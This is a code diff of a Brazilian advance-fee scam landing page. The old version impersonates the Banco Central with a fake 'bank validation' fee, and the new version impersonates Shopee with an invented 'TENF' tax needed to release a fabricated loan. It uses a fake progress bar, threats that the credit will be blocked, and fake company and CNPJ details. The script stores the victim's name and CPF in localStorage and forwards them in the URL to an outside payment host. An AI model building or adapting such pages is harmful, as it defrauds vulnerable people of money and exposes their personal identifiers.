@@ -1,7 +1,7 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Upsell 5 - Validação Bancária</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Taxa TENF | Shopee SCrédito</title>
 
 <!-- Meta Pixel Code -->
 <script>
@@ -20,200 +20,520 @@
 src="https://www.facebook.com/tr?id=913651397584478&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
-   
-    <script>
-        localStorage.setItem("upsell", "up5");
-    </script>
-   
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
 
-<script>
-  window.pixelId = "682f4a0b17362a4244bf5d3c";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
+  <script>
+    localStorage.setItem("upsell", "up3");
+  </script>
+  
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
 
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f8f9fa;
-            color: #333;
-        }
+  <script>
+    window.pixelId = "682f4a0b17362a4244bf5d3c";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
 
-        .header {
-            background-color: #004080;
-            padding: 20px;
-            text-align: center;
-        }
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
 
-        .header img {
-            max-width: 150px;
-        }
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            shopee: {
+              light: "#ff7337",
+              DEFAULT: "#ee4d2d",
+              dark: "#d5331a",
+            },
+          },
+        },
+      },
+    };
+  </script>
 
-        .container {
-            max-width: 600px;
-            margin: 40px auto;
-            padding: 30px;
-            background: #ffffff;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            border-radius: 10px;
-            text-align: center;
-        }
+  <style>
+    * {
+      margin: 0px;
+      padding: 0px;
+      box-sizing: border-box;
+    }
 
-        .container h1 {
-            color: #004080;
-            font-size: 26px;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
+    body {
+      font-family: "Poppins", sans-serif;
+      background-color: #f6f6f6;
+      min-height: 100vh;
+    }
 
-        .container p {
-            font-size: 16px;
-            color: #555;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
+    .shopee-gradient {
+      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+    }
 
-        .highlight {
-            color: #004080;
-            font-weight: bold;
-        }
+    .card {
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+      border-radius: 16px;
+      transition: all 0.3s ease;
+    }
 
-        .cta {
-            margin-top: 30px;
-        }
+    .btn-shine {
+      position: relative;
+      overflow: hidden;
+    }
 
-        .cta button {
-            background-color: #004080;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
+    .btn-shine:after {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to right,
+        rgba(255, 255, 255, 0) 0%,
+        rgba(255, 255, 255, 0.3) 50%,
+        rgba(255, 255, 255, 0) 100%
+      );
+      transform: rotate(30deg);
+      animation: shine 4s infinite;
+    }
 
-        .cta button:hover {
-            background-color: #0056b3;
-        }
+    @keyframes shine {
+      0% {
+        left: -100%;
+        opacity: 0;
+      }
+      10% {
+        left: 100%;
+        opacity: 0.6;
+      }
+      100% {
+        left: 100%;
+        opacity: 0;
+      }
+    }
 
-        .footer {
-            margin-top: 30px;
-            font-size: 14px;
-            color: #777;
-        }
+    .icon-circle {
+      width: 44px;
+      height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+    }
 
-        .footer strong {
-            color: #d9534f;
-        }
+    /* LOADING */
+    .loading {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-color: #fff;
+      padding: 2rem;
+      gap: 1.5rem;
+      border-radius: 16px;
+      margin: 1rem;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+    }
 
-        .info-box {
-            background-color: #f1f1f1;
-            border-left: 5px solid #004080;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: left;
-            font-size: 15px;
-            color: #333;
-        }
+    .loading.active {
+      display: flex;
+    }
 
-        .info-box h3 {
-            margin: 0;
-            font-size: 16px;
-            font-weight: bold;
-        }
-    </style>
+    .status-text {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #374151;
+      opacity: 1;
+      transition: opacity 0.5s ease;
+      text-align: center;
+    }
+
+    .status-text.fade-out {
+      opacity: 0;
+    }
+
+    .progress-bar {
+      width: 100%;
+      max-width: 400px;
+      height: 8px;
+      background-color: #f3f4f6;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.05);
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+      transition: width 0.1s linear;
+      border-radius: 8px;
+    }
+
+    /* Comprovante */
+    .comprovante {
+      background-color: white;
+      border: 1px solid #e5e7eb;
+      border-radius: 16px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
+      overflow: hidden;
+      margin-bottom: 1rem;
+    }
+
+    .comprovante-header {
+      background: linear-gradient(135deg, #ee4d2d 0%, #ff7337 100%);
+      padding: 1.5rem;
+      text-align: center;
+      color: white;
+    }
+
+    .comprovante-body {
+      padding: 1.5rem;
+    }
+
+    .comprovante-item {
+      padding: 12px 0;
+      border-bottom: 1px solid #f3f4f6;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .comprovante-item:last-child {
+      border-bottom: none;
+    }
+
+    .comprovante-alert {
+      background-color: #fef3c7;
+      border-left: 4px solid #f59e0b;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      font-size: 0.9rem;
+      color: #92400e;
+      border-radius: 0 8px 8px 0;
+    }
+
+    /* Content Final */
+    .content-final {
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
 </head>
+
 <body>
-
-    <div class="header">
-        <img src="https://s3.typebot.io/public/workspaces/clpwrgv88001vlh0fl3wduaqz/typebots/clsoykmoc0001o1a8fuuy3j8r/blocks/ymggz8eopp0fj524hfxubuit?v=1735166818525" alt="Logo Banco Central">
+  <div class="max-w-md mx-auto min-h-screen bg-white">
+    <!-- Header -->
+    <div class="flex items-center justify-between p-4 border-b bg-white shadow-sm sticky top-0 z-10">
+      <div class="flex items-center">
+        <div class="flex items-center">
+          <img src="../4/images/2560px-Shopee_logo.svg.png" alt="Shopee Logo" class="h-8">
+          <span class="ml-2 text-xl font-bold text-shopee">SCrédito</span>
+        </div>
+      </div>
+      <div class="flex flex-col items-end text-sm">
+        <div class="flex items-center font-medium text-gray-800">
+          <i class="fas fa-user-circle text-shopee mr-1"></i>
+          <span class="user-name">Olá, Rafael</span>
+        </div>
+      </div>
     </div>
 
-    <div class="container">
-        <h1>🔒 Validação Bancária Obrigatória</h1>
-        <p>Para garantir a segurança e regularidade da sua transferência, é necessária a realização de uma <span class="highlight">validação bancária obrigatória</span>, conforme as normas do sistema bancário nacional.</p>
-
-        <div class="info-box">
-            <h3>Por que a validação é necessária?</h3>
-            <p>✔️ Evita transações inválidas ou bloqueios futuros.</p>
-            <p>✔️ Confirma a autenticidade dos seus dados bancários.</p>
-            <p>✔️ Libera sua transferência com total segurança.</p>
-        </div>
-
-        <p><strong>Valor da Taxa:</strong> <span class="highlight">R$ 18,25</span></p>
-        <p><strong>Prazo para Validação:</strong> Até 15 minutos após o pagamento.</p>
-
-        <div class="cta">
-            <button onclick="checkout(event)">VALIDAR AGORA</button>
-        </div>
-
-        <div class="footer">
-            ⚠️ <strong>Atenção:</strong> O não pagamento pode causar o registro de sua conta como <strong>irregular</strong>, impactando futuras transações financeiras.
-        </div>
+    <!-- LOADING -->
+    <div class="loading" id="loading">
+      <div class="progress-bar">
+        <div class="progress-bar-fill" id="bar"></div>
+      </div>
+      <h2 class="status-text" id="status-text">Calculando sua Taxa TENF...</h2>
     </div>
-    <script>
-        function checkout(event) {
-          event.preventDefault();
-      
-          // Captura os parâmetros da URL atual
-          const urlParams = new URLSearchParams(window.location.search);
-          
-          // Remove parâmetros sensíveis como CPF e nome
-          urlParams.delete('cpf');
-          urlParams.delete('nome');
-          urlParams.delete('CPF');
-          urlParams.delete('NOME');
-          
-          // Constrói a URL de destino com parâmetros filtrados
-          const filteredParams = urlParams.toString();
-          const destino = filteredParams ? 
-              "https://pay.pagamentosfacilitadosoficial.shop/nWrxGWAxMdw3654?" + filteredParams :
-              "https://pay.pagamentosfacilitadosoficial.shop/nWrxGWAxMdw3654";
-      
-          // Redireciona
-          window.location.href = destino;
+
+    <!-- CARD PRINCIPAL -->
+    <div class="card active" id="card">
+      <div class="p-5">
+        <div class="content-initial">
+          <!-- Card de Valor Aprovado -->
+          <div class="bg-gray-50 rounded-xl p-4 text-center mb-6 card">
+            <p class="text-gray-700 font-medium mb-2">Crédito disponível</p>
+            <p id="valor-indenizacao" class="text-3xl font-bold text-shopee">R$ 7.854,63</p>
+          </div>
+
+          <!-- Alert -->
+          <div class="bg-shopee text-white p-4 rounded-xl mb-6">
+            <div class="flex items-start">
+              <div class="bg-white bg-opacity-20 icon-circle mr-3 flex-shrink-0">
+                <i class="fas fa-exclamation-triangle text-white"></i>
+              </div>
+              <p class="text-sm">
+                Atenção! <strong class="nome-usuario">Rafael dos Santos Almeida</strong>, leia a mensagem abaixo para liberar seu crédito
+              </p>
+            </div>
+          </div>
+
+          <!-- Pendência Card -->
+          <div class="bg-white p-6 rounded-xl card mb-6">
+            <div class="text-center mb-4">
+              <div class="bg-red-100 icon-circle mx-auto mb-3">
+                <i class="fas fa-exclamation-circle text-red-600"></i>
+              </div>
+              <h3 class="text-xl font-bold text-gray-800 mb-2">Pendência encontrada!</h3>
+            </div>
+            
+            <p class="text-gray-700 text-sm leading-relaxed text-center">
+              Para você receber o seu valor, é obrigatório realizar o pagamento do <strong>TENF (Taxa de Emissão de Nota Fiscal).</strong> 
+              O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. 
+              Clique no botão abaixo para calcular sua taxa TENF.
+            </p>
+          </div>
+
+          <button class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine" onclick="calcularTaxa()">
+            Calcular TAXA
+          </button>
+        </div>
+
+        <!-- Tela Final -->
+        <div class="content-final" id="final" style="display: none;">
+          <!-- Comprovante -->
+          <div class="comprovante">
+            <div class="comprovante-header">
+              <div class="bg-white inline-block p-2 rounded-lg mb-2">
+                <img src="../4/images/2560px-Shopee_logo.svg.png" alt="Shopee Logo" class="h-6">
+              </div>
+              <h2 class="text-xl font-bold">TENF (Taxa de Emissão de Nota Fiscal)</h2>
+              <p class="text-2xl font-bold mt-2">R$ 28,50</p>
+            </div>
+
+            <div class="comprovante-body">
+              <div class="comprovante-item">
+                <span class="text-gray-600">Empresa</span>
+                <span class="text-gray-800 font-medium">ShopeeCrédito S.A.</span>
+              </div>
+              <div class="comprovante-item">
+                <span class="text-gray-600">CNPJ</span>
+                <span class="text-gray-800 font-medium">09.694.966/0001-40</span>
+              </div>
+              <div class="comprovante-item">
+                <span class="text-gray-600">Beneficiário</span>
+                <span class="text-gray-800 font-medium nome-usuario">Rafael dos Santos Almeida</span>
+              </div>
+              <div class="comprovante-item">
+                <span class="text-gray-600">Valor do Empréstimo</span>
+                <span id="valor-indenizacao-comprovante" class="text-gray-800 font-medium">R$ 9.854,63</span>
+              </div>
+              <div class="comprovante-item">
+                <span class="text-gray-600">Taxa TENF</span>
+                <span class="text-shopee font-bold">R$ 28,50</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="comprovante-alert">
+            <div class="flex items-start">
+              <i class="fas fa-info-circle mr-2 mt-1"></i>
+              <p class="text-sm">
+                Para você receber o seu valor, é obrigatório realizar o pagamento do TENF (Taxa de Emissão de Nota Fiscal). 
+                O valor dessa taxa corresponde ao custo gerado por transferência de alto valor. Após o pagamento, 
+                a transferência será feita para sua chave PIX cadastrada. 
+                Caso não conclua o pagamento, seu crédito será bloqueada.
+              </p>
+            </div>
+          </div>
+
+          <button class="w-full bg-shopee hover:bg-shopee-dark text-white text-lg font-bold py-4 rounded-xl btn-shine mb-5" onclick="efetuarPagamento()">
+            Efetuar o pagamento
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search)
+    
+    // Função para salvar dados importantes no localStorage
+    function salvarDadosLocalStorage(nome, cpf, valorEmprestimo) {
+      if (nome && nome.trim() !== "") {
+        localStorage.setItem("userNome", nome);
+      }
+      if (cpf && cpf.trim() !== "") {
+        localStorage.setItem("userCpf", cpf);
+      }
+      if (valorEmprestimo && valorEmprestimo.trim() !== "") {
+        localStorage.setItem("userValorEmprestimo", valorEmprestimo);
+      }
+    }
+
+    // Função para recuperar dados do localStorage
+    function recuperarDadosLocalStorage() {
+      return {
+        nome: localStorage.getItem("userNome") || "",
+        cpf: localStorage.getItem("userCpf") || "",
+        valorEmprestimo: localStorage.getItem("userValorEmprestimo") || ""
+      };
+    }
+    
+    // Capturar dados com fallback para localStorage
+    let nomeCompleto = params.get("name") || params.get("nome") || "";
+    let cpf = params.get("cpf") || params.get("document") || "";
+    let valorEmprestimo = params.get("valor_emprestimo") || params.get("valor_aprovado") || "";
+    
+    // Se algum dado estiver vazio, tentar recuperar do localStorage
+    const dadosLocalStorage = recuperarDadosLocalStorage();
+    
+    if (!nomeCompleto || nomeCompleto.trim() === "") {
+      nomeCompleto = dadosLocalStorage.nome;
+      console.log("Nome recuperado do localStorage:", nomeCompleto);
+    }
+    
+    // Se ainda não tiver nome válido, usar valor padrão
+    if (!nomeCompleto || nomeCompleto.trim() === "") {
+      nomeCompleto = "Nome não informado";
+    }
+    
+    if (!cpf || cpf.trim() === "") {
+      cpf = dadosLocalStorage.cpf;
+      console.log("CPF recuperado do localStorage:", cpf);
+    }
+    
+    if (!valorEmprestimo || valorEmprestimo.trim() === "") {
+      valorEmprestimo = dadosLocalStorage.valorEmprestimo;
+      console.log("Valor do empréstimo recuperado do localStorage:", valorEmprestimo);
+    }
+    
+    // Salvar dados atuais no localStorage para uso futuro
+    salvarDadosLocalStorage(nomeCompleto, cpf, valorEmprestimo);
+    
+    const primeiroNome = nomeCompleto.trim().split(" ")[0]
+    
+    // Capturar o valor do empréstimo solicitado pelo usuário (já declarado acima)
+    // Usar valor padrão se não encontrar nenhum valor
+    if (!valorEmprestimo || valorEmprestimo.trim() === "") {
+      valorEmprestimo = "9782.23";
+    }
+    
+    // Função para formatar valor monetário
+    function formatarValor(valor) {
+      const numero = parseFloat(valor);
+      return numero.toLocaleString('pt-BR', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      });
+    }
+
+    // Atualizar elementos com nome do usuário e valor do empréstimo
+    document.addEventListener('DOMContentLoaded', function() {
+      // Função para disparar eventos do Facebook Pixel
+      function trackFacebookEvent(eventName, parameters = {}) {
+        if (typeof fbq !== 'undefined') {
+          fbq('track', eventName, parameters);
+          console.log(`Facebook Pixel - Evento ${eventName} enviado`);
         }
-        
-        // Função para trackear eventos de Facebook Pixel
-        function trackFacebookPixelEvent(event, params = {}) {
-          if (typeof fbq !== 'undefined') {
-            fbq('track', event, params);
-          }
-        }
-        
-        // Disparar eventos ViewContent
-        document.addEventListener('DOMContentLoaded', function() {
-          // Evento ViewContent no carregamento da página
-          trackFacebookPixelEvent('ViewContent', {
-            content_type: 'bank_validation',
-            content_name: 'Validação Bancária - Up3'
-          });
-          
-          // Trackear clique no botão "Validar Agora"
-          const btnValidar = document.querySelector('[onclick="checkout(event)"]');
-          if (btnValidar) {
-            btnValidar.addEventListener('click', function() {
-              trackFacebookPixelEvent('ViewContent', {
-                content_type: 'validation_payment',
-                content_name: 'Pagamento Validação Bancária'
-              });
-            });
-          }
+      }
+
+      // Disparar ViewContent quando a página carregar
+      trackFacebookEvent('ViewContent', {
+        content_type: 'page',
+        content_category: 'taxa_tenf'
+      });
+
+      document.querySelector(".user-name").textContent = `Olá, ${primeiroNome}`
+      const nomeElements = document.querySelectorAll(".nome-usuario")
+      nomeElements.forEach(element => {
+        element.textContent = nomeCompleto
+      })
+      
+      // Atualizar o valor da indenização com base no valor do empréstimo
+      const valorIndenizacao = document.getElementById("valor-indenizacao");
+      if (valorIndenizacao) {
+        valorIndenizacao.textContent = `R$ ${formatarValor(valorEmprestimo)}`;
+      }
+      
+      // Também atualizar no comprovante
+      const valorIndenizacaoComprovante = document.getElementById("valor-indenizacao-comprovante");
+      if (valorIndenizacaoComprovante) {
+        valorIndenizacaoComprovante.textContent = `R$ ${formatarValor(valorEmprestimo)}`;
+      }
+      
+      console.log('Valor do empréstimo recebido:', valorEmprestimo);
+      console.log('Nome do usuário:', nomeCompleto);
+      console.log('Dados do localStorage:', dadosLocalStorage);
+      console.log('Fonte dos dados:', {
+        fonteNome: params.get("name") || params.get("nome") ? "URL" : "localStorage",
+        fonteCpf: params.get("cpf") || params.get("document") ? "URL" : "localStorage",
+        fonteValor: params.get("valor_emprestimo") || params.get("valor_aprovado") ? "URL" : "localStorage"
+      });
+    })
+
+    function calcularTaxa() {
+      // Disparar evento do Facebook Pixel
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'ViewContent', {
+          content_type: 'calculation',
+          content_category: 'calculo_taxa'
         });
-      </script>
+      }
+
+      document.querySelector(".content-initial").style.display = "none";
+      document.getElementById("loading").classList.add("active");
+
+      const bar = document.getElementById("bar");
+      const statusText = document.getElementById("status-text");
+      let progress = 0;
+      let trocado = false;
+
+      const interval = setInterval(() => {
+        if (progress >= 100) {
+          clearInterval(interval);
+          document.getElementById("loading").classList.remove("active");
+          document.getElementById("final").style.display = "block";
+        } else {
+          progress++;
+          bar.style.width = progress + "%";
+
+          if (progress === 70 && !trocado) {
+            trocado = true;
+            statusText.classList.add('fade-out');
+            setTimeout(() => {
+              statusText.textContent = "Gerando seu comprovante...";
+              statusText.classList.remove('fade-out');
+            }, 500);
+          }
+        }
+      }, 30);
+    }
+
+    function efetuarPagamento() {
+      // Disparar evento do Facebook Pixel
+      if (typeof fbq !== 'undefined') {
+        fbq('track', 'Purchase', {
+          content_type: 'service',
+          content_category: 'pagamento_tenf'
+        });
+      }
+
+      const currentParams = window.location.search;
+      const urlBase = "https://pay.pagamentosfacilitadosoficial.shop/lDW0ZaJerX6GN7E";
+      window.location.href = `${urlBase}${currentParams}`;
+    }
+  </script>
 
 </body></html>
